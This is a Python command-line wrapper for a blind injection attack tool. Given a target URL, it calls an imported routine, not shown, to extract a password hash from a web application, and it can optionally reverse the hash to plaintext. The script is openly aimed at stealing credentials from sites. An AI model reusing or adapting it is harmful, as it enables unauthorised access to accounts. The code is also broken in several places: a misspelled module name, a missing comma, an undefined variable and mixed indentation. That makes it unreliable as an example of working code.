#!/usr/bin/env python3
#
#  -*- coding: utf8 -*-
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#  Copyright 2012 Yannick Méheut <useless@utouch.fr>

import os, sys, argparse
from blind_functions import *

def parse_arguments():
    '''
    This function is used to parse the arguments given on the command line.
    '''

    # We define an argument parser
    parser = argparser.ArgumentParser()

    # We define the arguments needed to perform the injection
    parser.add_argument('-u', '--url', required=True,
	    help='URL where the injection will be performed')
    parser.add_argument('-c', '--characters', type=str,
	    default='0123456789abcdef',
	    help='authorized characters sorted in increasing order\
		    (default: %(default)s')
    parser.add_argument('-s', '--string', type=str, required=True,
	    help='string the script will look for in the binary search')
    parser.add_argument('-l', '--length', type=int, default=32
	    help='length of the hash (default: %(default)s)')
    parser.add_argument('--crack-hash', action='store_true',
	    help='flag to use if you want the script to crack the hash')

    # We parse the arguments from the command line
    args = parser.parse_args()

    # We return the arguments
    return args

def main():
    '''
    This is the main function. It calls the function that parses arguments,
    and call the functions necessary to the injection.
    '''

    # We display a copyright message
    print('Blind Injection (Copyright 2012 Yannick Méheut <useless@utouch.fr>)\n')

    # We get the argument
    args = parse_arguments()

    # We perform the injection
    hash_password = blind_injection(args.url,
	    args.characters,
	    args.string,
	    args.length)

    # We reverse the hash if asked to
    if (crack_hash):
	sys.stdout.write('Reversing the hash... ')
	sys.stdout.flush()
	plain_password = reverse_hash(hash_password)
	sys.stdout.write(plain_password + '\n')

if __name__ == '__main__':
    main()

